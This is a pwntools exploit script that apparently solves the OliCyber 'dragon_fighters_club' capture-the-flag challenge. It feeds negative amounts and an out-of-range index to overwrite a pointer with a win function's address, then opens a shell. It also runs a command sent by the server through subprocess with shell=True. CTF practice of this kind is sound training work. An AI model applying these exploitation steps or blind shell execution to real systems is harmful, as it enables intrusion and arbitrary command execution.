#!/usr/bin/env python3

from pwn import *
from tqdm import trange
import subprocess

elf = ELF("./dragon_fighters_club")

context.binary = elf


def conn():
    if args.REMOTE:
        p = remote("dragonfightersclub.challs.olicyber.it", 38303)
    elif args.GDB:
        p = gdb.debug([elf.path], ''' 
    b main
    b fight
    ignore 2 60    
    c
    ''')
    else:
        p = process([elf.path])

    return p


def main():
    p = conn()

    p.recvuntil(b'or\n')
    command = p.recvline().strip()
    outp = subprocess.run(command, shell=True, capture_output=True).stdout
    p.sendlineafter(b':', outp)
    win_addr = 0x4012C1     
    exit_addr = 0x4010b0
    # p.interactive()
    for i in trange(10):
        p.sendlineafter(b'>',b'3')
        p.sendlineafter(b'>',b'3')
        p.sendlineafter(b'?\n', b'-4000')
    for i in trange(50):
        p.sendlineafter(b'>',b'3')
        p.sendlineafter(b'>',b'3')
        p.sendlineafter(b'?\n', b'-24000')
        
    diff = exit_addr - win_addr
    print(diff)
    p.sendlineafter(b'>',b'3')
    p.sendlineafter(b'>', b'-5')
    p.sendlineafter(b'?\n', b"-529")

    p.sendlineafter(b'>', b'5')
    p.interactive()


if __name__ == "__main__":
    main()
